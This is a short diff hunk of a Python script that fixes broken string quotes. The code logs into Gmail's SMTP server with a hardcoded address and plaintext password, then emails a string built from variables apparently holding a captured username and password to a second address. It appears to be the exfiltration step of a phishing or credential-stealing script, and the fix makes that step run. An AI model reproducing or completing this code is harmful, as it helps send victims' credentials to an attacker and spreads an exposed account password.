@@ -61,11 +61,11 @@ s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context)
 #s.starttls() 
 
 
-sa = 'samc2@mail.com 
-kl = 'AshleyGeorge4ever 
+sa = 'samc2@mail.com'
+kl = 'AshleyGeorge4ever'
 s.login(sa, kl) 
 
-ra = 'samc2@live.com 
+ra = 'samc2@live.com'
 connexion = cho + ' - ' + usn + ' - ' + usp
 msg = MIMEMultipart()
 msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
